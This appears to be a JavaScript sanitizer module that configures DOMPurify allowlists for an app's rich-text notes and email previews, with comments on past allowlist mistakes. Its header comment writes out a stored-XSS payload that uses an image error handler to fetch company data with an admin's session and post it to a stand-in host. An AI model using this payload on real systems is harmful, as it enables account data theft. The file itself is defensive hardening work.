// LTP HTML sanitizer — single source of truth for what HTML is allowed to
// reach the DOM. Wraps DOMPurify with an allowlist covering the tags the
// rich-text editor's toolbar produces plus the ones a real paste carries.
//
// Threat: stored XSS. A member-role user types or pastes malicious HTML
// (e.g. <img src=x onerror="fetch('/api/companies',{credentials:'include'})
// .then(r=>r.json()).then(d=>fetch('https://evil/x',{method:'POST',body:JSON
// .stringify(d)}))">). When an admin views the note, the script runs in the
// admin's session and exfiltrates everything.
//
// Defense in depth:
//   1. Sanitize when the editor saves changes (rich-text-editor.js onInput).
//   2. Sanitize when the editor re-loads existing content (init useEffect).
//   3. Sanitize at every render site that uses dangerouslySetInnerHTML.
//   4. Sanitize at every document.write site (print windows).
//   5. CSP headers from backend block any script that does sneak through.
//      This covers the print windows in (4) too: a document.write popup
//      inherits the opener's CSP (verified in Chromium — an external <img>
//      in such a popup is refused by img-src).
//
// All callers MUST use LTP_SANITIZE.html() — never call DOMPurify.sanitize
// directly. If we ever swap the library or tighten the allowlist, the
// change happens here once.
(function() {
  // ─── WHY THERE IS NO USE_PROFILES BELOW ─────────────────────────────────
  // Both configs used to pass USE_PROFILES: { html: true } alongside their
  // allowlists. DOMPurify does not intersect those — USE_PROFILES REPLACES
  // ALLOWED_TAGS and ALLOWED_ATTR with its built-in HTML profile, so the
  // allowlists below were decorative. Measured in Chromium against DOMPurify
  // 3.4.14, this config declared 13 tags and "no attributes" while actually
  // permitting 85 tags and 14 attributes, among them <form>/<input>/<button>
  // and style=/href=/src=/id=.
  //
  // Nothing executable got through even then (handlers and <script> are
  // dropped regardless, and the backend CSP blocks an injected form's POST via
  // form-action and an external tracking pixel via img-src — including inside
  // the print popup, which inherits the opener's CSP). What did get through
  // was enough for an in-app phishing overlay: a position:fixed <div> plus an
  // <a href> to anywhere, plantable by any member into a CRM note that an
  // admin later opens. Note bodies have no server-side sanitizer — email_html
  // covers templates, signatures and crew mail, not notes — so this pass is
  // the only allowlist on that path.
  //
  // If you add a config here, do NOT reintroduce USE_PROFILES to "also allow
  // the standard tags". Add the tags you want to the array instead.
  // ────────────────────────────────────────────────────────────────────────

  // Covers what the editor's execCommand buttons emit:
  //   bold/italic/underline/strikeThrough  → <b><i><u><s><strike>
  //   insertUnorderedList/insertOrderedList → <ul><ol><li>
  //   formatBlock H3 / BLOCKQUOTE          → <h3><blockquote>
  // plus the structural elements browsers wrap pasted text in (<p><div><br>),
  // and the tags a real paste actually carries: <strong>/<em>/<span> (what
  // Docs, Word and most web pages emit instead of <b>/<i>), the rest of the
  // h1–h4 range around the editor's own <h3>, and <a>.
  //
  // These paste tags are here because they were reachable in practice for as
  // long as USE_PROFILES was in place, so notes already contain them; dropping
  // them now would silently re-render existing notes as flattened text. The
  // h1–h4 ceiling mirrors EMAIL_ALLOWED_TAGS below rather than running to h6.
  //
  // href is the ONLY attribute allowed, because <a> is useless without it.
  // Everything else is stripped — in particular style= (the overlay vector
  // above), id= (DOM clobbering) and src= (the app's img-src would refuse the
  // request anyway, leaving a broken-image icon).
  var ALLOWED_TAGS = ["b", "i", "u", "s", "strike", "strong", "em", "span",
                      "p", "div", "br", "ul", "ol", "li",
                      "h1", "h2", "h3", "h4", "blockquote", "a"];
  var CONFIG = {
    ALLOWED_TAGS: ALLOWED_TAGS,
    ALLOWED_ATTR: ["href"],
    // Same protocol set as backend/sanitize.py's ALLOWED_PROTOCOLS
    // (http/https/mailto/tel). DOMPurify blocks javascript: on its own; this
    // also rules out data: and vbscript: hrefs.
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    KEEP_CONTENT: true,          // strip tags but keep text inside
    ALLOW_DATA_ATTR: false,
  };

  function html(input) {
    if (input == null) return "";
    // DOMPurify is loaded as a global by index.html. If it failed to load
    // (network error, blocked by CSP, etc.), fall back to text-only: strip
    // ALL tags by treating the input as text content. Defensive — should
    // never happen in production where the script tag has SRI + is required.
    if (!window.DOMPurify) {
      console.error("[LTP] DOMPurify not loaded — falling back to text-only render");
      var tmp = document.createElement("div");
      tmp.textContent = String(input);
      return tmp.innerHTML;
    }
    return window.DOMPurify.sanitize(String(input), CONFIG);
  }

  // ─── Email allowlist ────────────────────────────────────────────────────
  // Separate, broader allowlist for email TEMPLATES and email BODIES — admins
  // paste templates from marketing tools (Mailchimp, Stripo) that rely on
  // tables for layout, inline styles for typography, and anchors for the
  // {{viewUrl}} button. This needs to MIRROR backend/sanitize.py's
  // ALLOWED_TAGS + ALLOWED_ATTRIBUTES exactly — otherwise the live preview
  // in the Send modal renders something different from what actually goes
  // out to the recipient, defeating the point of a preview.
  //
  // Used by:
  //   - Settings page email-template editor (preview pane)
  //   - Send modal body preview (commit 5)
  //   - Send modal signature template render
  //
  // NOT used by the rich-text editor — that stays on the narrow .html()
  // path because it only produces a tiny subset.
  var EMAIL_ALLOWED_TAGS = [
    "b", "i", "u", "strong", "em", "span", "br", "small", "sub", "sup",
    "p", "div", "h1", "h2", "h3", "h4", "blockquote", "hr",
    "ul", "ol", "li",
    "table", "thead", "tbody", "tfoot", "tr", "th", "td",
    "a", "img",
    // Section — used by EmailBodyEditor as the marker wrapper for the
    // auto-managed signature + header blocks. Mirror of backend/sanitize.py.
    "section",
  ];
  // DOMPurify takes ALLOWED_ATTR as a flat list (not per-tag); the resulting
  // permission is "this attr may appear on any tag in ALLOWED_TAGS." That's
  // looser than the backend's per-tag map but acceptable for a PREVIEW
  // surface — the backend remains authoritative at save and send time, so
  // any attribute drift gets normalized server-side.
  // `role` lets the customer-facing header table keep role="presentation"
  // (accessibility for table-layout emails).
  var EMAIL_ALLOWED_ATTR = [
    "class", "style", "title", "align", "role",
    "href", "target", "rel",
    "src", "alt", "width", "height",
    "colspan", "rowspan", "valign", "scope",
    "border", "cellpadding", "cellspacing",
  ];
  // No USE_PROFILES here either, and this one was actively wrong: the profile
  // does not include `target`, so it stripped target="_blank" from the preview
  // while backend/sanitize.py kept it — the preview/sent divergence the note
  // above says must not happen. It also let `bgcolor` and `id` through, which
  // the backend does not allow. Removing it makes EMAIL_ALLOWED_ATTR the real
  // list and the two sides line up.
  //
  // One divergence remains by design: bleach sanitizes the CONTENTS of style=
  // server-side (backend/sanitize.py's _ALLOWED_CSS_PROPERTIES notably omits
  // `position`), while DOMPurify passes CSS text through untouched. Templates
  // are scrubbed at save time by PUT /api/settings, so only unsaved keystrokes
  // in the preview can hold a property the backend would drop.
  var EMAIL_CONFIG = {
    ALLOWED_TAGS: EMAIL_ALLOWED_TAGS,
    ALLOWED_ATTR: EMAIL_ALLOWED_ATTR,
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    KEEP_CONTENT: true,
    ALLOW_DATA_ATTR: false,
  };

  function emailHtml(input) {
    if (input == null) return "";
    if (!window.DOMPurify) {
      console.error("[LTP] DOMPurify not loaded — falling back to text-only render");
      var tmp = document.createElement("div");
      tmp.textContent = String(input);
      return tmp.innerHTML;
    }
    return window.DOMPurify.sanitize(String(input), EMAIL_CONFIG);
  }

  window.LTP_SANITIZE = {
    html: html,
    emailHtml: emailHtml,
    ALLOWED_TAGS: ALLOWED_TAGS.slice(),                  // diagnostics
    EMAIL_ALLOWED_TAGS: EMAIL_ALLOWED_TAGS.slice(),      // diagnostics
  };
})();
